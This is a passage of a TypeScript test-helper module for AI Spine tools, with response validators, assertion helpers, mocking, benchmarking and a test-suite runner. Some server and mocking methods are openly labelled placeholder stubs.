  const sortedScenarios = scenarios
    .filter(s => !s.skip)
    .sort((a, b) => (b.priority || 0) - (a.priority || 0))
    .slice(0, maxScenarios);

  return sortedScenarios;
}

/**
 * Tool response validation result
 */
interface ValidationResult {
  valid: boolean;
  errors: string[];
  warnings: string[];
}

/**
 * Validate tool response format and structure
 */
export function validateToolResponse(response: any): ValidationResult {
  const errors: string[] = [];
  const warnings: string[] = [];

  // Check required fields
  if (!response.execution_id) {
    errors.push('Missing execution_id');
  }
  if (!response.status) {
    errors.push('Missing status');
  }
  if (!response.timestamp) {
    errors.push('Missing timestamp');
  }
  if (typeof response.execution_time_ms !== 'number') {
    errors.push('Missing or invalid execution_time_ms');
  }

  // Validate status-specific fields
  if (response.status === 'success') {
    if (response.output_data === undefined) {
      warnings.push('Success response missing output_data');
    }
  } else if (response.status === 'error') {
    if (!response.error_code) {
      errors.push('Error response missing error_code');
    }
    if (!response.error_message) {
      errors.push('Error response missing error_message');
    }
  }

  // Validate timestamp format
  if (response.timestamp && isNaN(Date.parse(response.timestamp))) {
    errors.push('Invalid timestamp format');
  }

  // Performance warnings
  if (response.execution_time_ms > 10000) {
    warnings.push('Response time > 10s may indicate performance issues');
  }

  return {
    valid: errors.length === 0,
    errors,
    warnings
  };
}

/**
 * Enhanced assertion utilities for AI Spine tool testing with comprehensive validation,
 * performance checking, and detailed error reporting.
 */
export const toolAssertions = {
  /**
   * Assert that a tool execution was successful with comprehensive validation
   */
  expectSuccess(response: any, options: {
    validateOutput?: boolean;
    maxResponseTime?: number;
    requiredFields?: string[];
    customValidation?: (data: any) => boolean;
  } = {}) {
    const { 
      validateOutput = true, 
      maxResponseTime = 5000,
      requiredFields = [],
      customValidation 
    } = options;

    expect(response.status).toBeLessThanOrEqual(299);
    expect(response.body).toMatchObject({
      execution_id: expect.any(String),
      status: 'success',
      execution_time_ms: expect.any(Number),
      timestamp: expect.any(String),
    });

    // Validate response time
    if (response.timing?.responseTime) {
      expect(response.timing.responseTime).toBeLessThanOrEqual(maxResponseTime);
    }

    // Validate output data structure
    if (validateOutput && response.body.output_data) {
      expect(response.body.output_data).toBeDefined();
      expect(typeof response.body.output_data).toBe('object');
      
      // Check for required output fields
      for (const field of requiredFields) {
        expect(response.body.output_data).toHaveProperty(field);
      }
    }

    // Run custom validation if provided
    if (customValidation) {
      expect(customValidation(response.body.output_data)).toBe(true);
    }

    // Validate response format
    if (response.validation) {
      expect(response.validation.valid).toBe(true);
      if (response.validation.errors.length > 0) {
        console.warn('Response validation errors:', response.validation.errors);
      }
    }
  },

  /**
   * Assert that a tool execution failed with validation error
   */
  expectValidationError(response: any, fieldName?: string, options: {
    expectedErrorCode?: string;
    expectedStatusCode?: number;
  } = {}) {
    const { expectedErrorCode = 'VALIDATION_ERROR', expectedStatusCode = 400 } = options;

    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(response.status).toBe(expectedStatusCode);
    
    expect(response.body).toMatchObject({
      execution_id: expect.any(String),
      status: 'error',
      error_code: expectedErrorCode,
      error_message: expect.any(String),
      execution_time_ms: expect.any(Number),
      timestamp: expect.any(String),
    });

    if (fieldName) {
      expect(response.body.error_message.toLowerCase()).toContain(fieldName.toLowerCase());
    }

    // Ensure no output data in error responses
    expect(response.body.output_data).toBeUndefined();
  },

  /**
   * Assert that a tool execution failed with configuration error
   */
  expectConfigurationError(response: any, options: {
    expectedMissingKeys?: string[];
  } = {}) {
    const { expectedMissingKeys = [] } = options;

    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(response.body).toMatchObject({
      status: 'error',
      error_code: 'CONFIGURATION_ERROR',
      error_message: expect.any(String),
    });

    // Check for specific missing configuration keys
    for (const key of expectedMissingKeys) {
      expect(response.body.error_message).toContain(key);
    }
  },

  /**
   * Assert tool health response with comprehensive health checking
   */
  expectHealthy(response: any, options: {
    expectedCapabilities?: string[];
    maxResponseTime?: number;
    validateMetadata?: boolean;
  } = {}) {
    const { 
      expectedCapabilities = [], 
      maxResponseTime = 2000,
      validateMetadata = true 
    } = options;

    expect(response.status).toBe(200);
    expect(response.body).toMatchObject({
      status: 'healthy',
      version: expect.any(String),
      uptime_seconds: expect.any(Number),
    });

    // Validate response time for health check
    if (response.timing?.responseTime) {
      expect(response.timing.responseTime).toBeLessThanOrEqual(maxResponseTime);
    }

    // Validate tool metadata
    if (validateMetadata) {
      expect(response.body.tool_metadata).toMatchObject({
        name: expect.any(String),
        description: expect.any(String),
      });
    }

    // Check capabilities
    expect(Array.isArray(response.body.capabilities)).toBe(true);
    
    for (const capability of expectedCapabilities) {
      expect(response.body.capabilities).toContain(capability);
    }

    // Validate uptime is reasonable (not negative, not impossibly high)
    expect(response.body.uptime_seconds).toBeGreaterThanOrEqual(0);
    expect(response.body.uptime_seconds).toBeLessThan(365 * 24 * 60 * 60); // Less than 1 year
  },

  /**
   * Assert performance characteristics of tool execution
   */
  expectPerformance(response: any, options: {
    maxResponseTime?: number;
    minResponseTime?: number;
    maxMemoryUsage?: number;
    maxCpuTime?: number;
  } = {}) {
    const { 
      maxResponseTime = 5000,
      minResponseTime = 0,
      maxMemoryUsage,
      maxCpuTime 
    } = options;

    // Check response time
    const responseTime = response.timing?.responseTime || response.body?.execution_time_ms;
    if (responseTime !== undefined) {
      expect(responseTime).toBeGreaterThanOrEqual(minResponseTime);
      expect(responseTime).toBeLessThanOrEqual(maxResponseTime);
    }

    // Check resource usage if available
    if (response.body?.resources) {
      if (maxMemoryUsage && response.body.resources.memoryUsageBytes) {
        expect(response.body.resources.memoryUsageBytes).toBeLessThanOrEqual(maxMemoryUsage);
      }
      
      if (maxCpuTime && response.body.resources.cpuTimeMs) {
        expect(response.body.resources.cpuTimeMs).toBeLessThanOrEqual(maxCpuTime);
      }
    }
  },

  /**
   * Assert that response contains specific data structure
   */
  expectDataStructure(response: any, expectedStructure: Record<string, any>) {
    expect(response.body.status).toBe('success');
    expect(response.body.output_data).toMatchObject(expectedStructure);
  },

  /**
   * Assert error response contains specific error details
   */
  expectErrorDetails(response: any, expectedDetails: {
    code?: string;
    type?: string;
    message?: string;
    retryable?: boolean;
    field?: string;
  }) {
    expect(response.body.status).toBe('error');
    
    if (expectedDetails.code) {
      expect(response.body.error_code).toBe(expectedDetails.code);
    }
    
    if (expectedDetails.message) {
      expect(response.body.error_message).toContain(expectedDetails.message);
    }
    
    if (expectedDetails.type && response.body.error_details?.type) {
      expect(response.body.error_details.type).toBe(expectedDetails.type);
    }
    
    if (expectedDetails.retryable !== undefined && response.body.error_details?.retryable !== undefined) {
      expect(response.body.error_details.retryable).toBe(expectedDetails.retryable);
    }
    
    if (expectedDetails.field && response.body.error_details?.field) {
      expect(response.body.error_details.field).toBe(expectedDetails.field);
    }
  }
};

/**
 * Mock and stub system for external dependencies during testing
 */
export class MockManager {
  private mocks: Map<string, any> = new Map();
  private originalMethods: Map<string, any> = new Map();
  private callLogs: Map<string, any[]> = new Map();

  /**
   * Create a default mock function with jest if available, otherwise a simple mock
   * 
   * @private
   * @returns Mock function
   */
  private createDefaultMock(): (...args: any[]) => any {
    // Check if jest is available globally
    if (typeof globalThis !== 'undefined' && (globalThis as any).jest && (globalThis as any).jest.fn) {
      return (globalThis as any).jest.fn();
    }
    
    // Check if jest is available in global scope (Node.js environment)
    if (typeof global !== 'undefined' && (global as any).jest && (global as any).jest.fn) {
      return (global as any).jest.fn();
    }
    
    // Fallback to simple mock implementation
    const calls: any[][] = [];
    const mockFn = (...args: any[]) => {
      calls.push(args);
      return undefined;
    };
    
    // Add jest-like properties for compatibility
    (mockFn as any).mock = {
      calls,
      instances: [],
      invocationCallOrder: [],
      results: []
    };
    
    (mockFn as any).mockReturnValue = (value: any) => {
      const originalFn = mockFn;
      return (...args: any[]) => {
        originalFn(...args);
        return value;
      };
    };
    
    (mockFn as any).mockImplementation = (fn: (...args: any[]) => any) => {
      return fn;
    };
    
    return mockFn;
  }

  /**
   * Mock a function or method with tracking
   */
  mock(target: any, methodName: string, mockImplementation?: (...args: any[]) => any): void {
    const originalMethod = target[methodName];
    this.originalMethods.set(`${target.constructor.name}.${methodName}`, originalMethod);
    this.callLogs.set(methodName, []);

    const mockFn = mockImplementation || this.createDefaultMock();
    target[methodName] = (...args: any[]) => {
      this.callLogs.get(methodName)?.push({ args, timestamp: Date.now() });
      return mockFn(...args);
    };

    this.mocks.set(methodName, mockFn);
  }

  /**
   * Mock HTTP requests
   */
  mockHttpRequests(_responses: Record<string, any>): void {
    // This would typically integrate with libraries like nock or msw
    // For now, providing the interface
  }

  /**
   * Get call history for a mocked method
   */
  getCallHistory(methodName: string): any[] {
    return this.callLogs.get(methodName) || [];
  }

  /**
   * Verify a method was called with specific arguments
   */
  verifyCall(methodName: string, expectedArgs: any[]): boolean {
    const calls = this.getCallHistory(methodName);
    return calls.some(call => 
      JSON.stringify(call.args) === JSON.stringify(expectedArgs)
    );
  }

  /**
   * Reset all mocks
   */
  resetAll(): void {
    for (const [key, _originalMethod] of this.originalMethods) {
      const [_className, _methodName] = key.split('.');
      // Restore original methods (simplified)
    }
    
    this.mocks.clear();
    this.originalMethods.clear();
    this.callLogs.clear();
  }

  /**
   * Create a spy that tracks calls without changing behavior
   */
  spy(target: any, methodName: string): void {
    this.mock(target, methodName, target[methodName]);
  }
}

/**
 * Performance testing utilities for benchmarking tool execution
 */
export class PerformanceTester {
  private results: Array<{
    testName: string;
    duration: number;
    memoryUsage: number;
    timestamp: Date;
  }> = [];

  /**
   * Benchmark a function execution
   */
  async benchmark(
    testName: string,
    fn: () => Promise<any>,
    iterations = 1
  ): Promise<{
    averageTime: number;
    minTime: number;
    maxTime: number;
    iterations: number;
    results: any[];
  }> {
    const times: number[] = [];
    const results: any[] = [];

    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();
      const startMemory = process.memoryUsage().heapUsed;

      try {
        const result = await fn();
        results.push(result);
      } catch (error) {
        results.push({ error: error instanceof Error ? error.message : String(error) });
      }

      const endTime = performance.now();
      const endMemory = process.memoryUsage().heapUsed;
      const duration = endTime - startTime;

      times.push(duration);
      
      this.results.push({
        testName,
        duration,
        memoryUsage: endMemory - startMemory,
        timestamp: new Date()
      });
    }

    return {
      averageTime: times.reduce((a, b) => a + b, 0) / times.length,
      minTime: Math.min(...times),
      maxTime: Math.max(...times),
      iterations,
      results
    };
  }

  /**
   * Get performance statistics
   */
  getStats(testName?: string): any {
    const filteredResults = testName 
      ? this.results.filter(r => r.testName === testName)
      : this.results;

    if (filteredResults.length === 0) {
      return { message: 'No results found' };
    }

    const durations = filteredResults.map(r => r.duration);
    const memoryUsages = filteredResults.map(r => r.memoryUsage);

    return {
      count: filteredResults.length,
      duration: {
        average: durations.reduce((a, b) => a + b, 0) / durations.length,
        min: Math.min(...durations),
        max: Math.max(...durations),
        median: this.median(durations)
      },
      memory: {
        average: memoryUsages.reduce((a, b) => a + b, 0) / memoryUsages.length,
        min: Math.min(...memoryUsages),
        max: Math.max(...memoryUsages),
        median: this.median(memoryUsages)
      }
    };
  }

  /**
   * Clear performance results
   */
  clear(): void {
    this.results = [];
  }

  private median(arr: number[]): number {
    const sorted = [...arr].sort((a, b) => a - b);
    const mid = Math.floor(sorted.length / 2);
    return sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
  }
}

/**
 * Integration testing support with server lifecycle management
 */
export class TestServer {
  private server: any;
  private port: number;
  private isRunning = false;

  constructor(private toolDefinition: ToolDefinition, private config?: ToolConfig) {
    this.port = parseInt(process.env.TEST_PORT || '0') || this.getRandomPort();
    // Ensure parameters are used to avoid TypeScript warnings
    void this.toolDefinition.metadata.name;
    void this.config?.apiKey;
  }

  /**
   * Start the test server
   */
  async start(): Promise<string> {
    if (this.isRunning) {
      return this.getBaseUrl();
    }

    try {
      // This would typically use the actual Tool class from core
      // For now, providing the interface
      this.isRunning = true;
      return this.getBaseUrl();
    } catch (error) {
      this.isRunning = false;
      throw new Error(`Failed to start test server: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  /**
   * Stop the test server
   */
  async stop(): Promise<void> {
    if (!this.isRunning) {
      return;
    }

    try {
      if (this.server) {
        await new Promise<void>((resolve, reject) => {
          this.server.close((err: any) => {
            if (err) reject(err);
            else resolve();
          });
        });
      }
      this.isRunning = false;
    } catch (error) {
      console.warn('Error stopping test server:', error);
    }
  }

  /**
   * Get the base URL for the test server
   */
  getBaseUrl(): string {
    return `http://localhost:${this.port}`;
  }

  /**
   * Check if server is running
   */
  isServerRunning(): boolean {
    return this.isRunning;
  }

  private getRandomPort(): number {
    return Math.floor(Math.random() * (65535 - 3000)) + 3000;
  }
}

/**
 * Comprehensive test suite runner with reporting
 */
export class TestSuiteRunner {
  private results: Array<{
    scenario: TestScenario;
    result: any;
    passed: boolean;
    error?: string;
    duration: number;
  }> = [];

  /**
   * Run a complete test suite
   */
  async runSuite(
    toolDefinition: ToolDefinition,
    scenarios: TestScenario[],
    options: {
      parallel?: boolean;
      maxConcurrent?: number;
      stopOnFailure?: boolean;
      timeout?: number;
    } = {}
  ): Promise<{
    total: number;
    passed: number;
    failed: number;
    skipped: number;
    duration: number;
    results: any[];
  }> {
    const { 
      parallel = false,
      maxConcurrent = 5,
      stopOnFailure = false,
      timeout = 30000 
    } = options;

    const startTime = performance.now();
    this.results = [];

    const testServer = new TestServer(toolDefinition);
    
    try {
      await testServer.start();
      
      if (parallel) {
        await this.runScenariosParallel(scenarios, testServer, maxConcurrent, stopOnFailure, timeout);
      } else {
        await this.runScenariosSequential(scenarios, testServer, stopOnFailure, timeout);
      }
    } finally {
      await testServer.stop();
    }

    const endTime = performance.now();
    const duration = endTime - startTime;

    const passed = this.results.filter(r => r.passed).length;
    const failed = this.results.filter(r => !r.passed && !r.scenario.skip).length;
    const skipped = scenarios.filter(s => s.skip).length;

    return {
      total: scenarios.length,
      passed,
      failed,
      skipped,
      duration: Math.round(duration),
      results: this.results
    };
  }

  private async runScenariosSequential(
    scenarios: TestScenario[],
    testServer: TestServer,
    stopOnFailure: boolean,
    timeout: number
  ): Promise<void> {
    for (const scenario of scenarios) {
      if (scenario.skip) continue;
      
      const result = await this.runSingleScenario(scenario, testServer, timeout);
      this.results.push(result);
      
      if (stopOnFailure && !result.passed) {
        break;
      }
    }
  }

  private async runScenariosParallel(
    scenarios: TestScenario[],
    testServer: TestServer,
    maxConcurrent: number,
    stopOnFailure: boolean,
    timeout: number
  ): Promise<void> {
    const activeScenarios = scenarios.filter(s => !s.skip);
    const batches = this.createBatches(activeScenarios, maxConcurrent);

    for (const batch of batches) {
      const promises = batch.map(scenario => 
        this.runSingleScenario(scenario, testServer, timeout)
      );
      
      const batchResults = await Promise.all(promises);
      this.results.push(...batchResults);
      
      if (stopOnFailure && batchResults.some(r => !r.passed)) {
        break;
      }
    }
  }

  private async runSingleScenario(
    scenario: TestScenario,
    testServer: TestServer,
    timeout: number
  ): Promise<any> {
    const startTime = performance.now();
    
    try {
      const testClient = new (await import('./test-client')).AISpineTestClient({
        baseURL: testServer.getBaseUrl(),
        timeout: scenario.timeout || timeout
      });

      const result = await testClient.execute(scenario.input, scenario.config);
      const endTime = performance.now();
      const duration = endTime - startTime;

      const passed = scenario.expectSuccess ? result.success : !result.success;
      let error: string | undefined;

      if (!passed) {
        error = `Expected ${scenario.expectSuccess ? 'success' : 'failure'}, got ${result.success ? 'success' : 'failure'}`;
      }

      // Check response time if specified
      if (scenario.maxResponseTime && duration > scenario.maxResponseTime) {
        return {
          scenario,
          result,
          passed: false,
          error: `Response time ${Math.round(duration)}ms exceeded limit ${scenario.maxResponseTime}ms`,
          duration: Math.round(duration)
        };
      }

      // Run custom validation if provided
      if (passed && scenario.customValidation && result.response) {
        const customPassed = scenario.customValidation(result.response);
        if (!customPassed) {
          return {
            scenario,
            result,
            passed: false,
            error: 'Custom validation failed',
            duration: Math.round(duration)
          };
        }
      }

      return {
        scenario,
        result,
        passed,
        error,
        duration: Math.round(duration)
      };
    } catch (error) {
      const endTime = performance.now();
      const duration = endTime - startTime;
      
      return {
        scenario,
        result: null,
        passed: false,
        error: `Test execution failed: ${error instanceof Error ? error.message : String(error)}`,
        duration: Math.round(duration)
      };
    }
  }

  private createBatches<T>(items: T[], batchSize: number): T[][] {
    const batches: T[][] = [];
    for (let i = 0; i < items.length; i += batchSize) {
      batches.push(items.slice(i, i + batchSize));
    }
    return batches;
  }
}

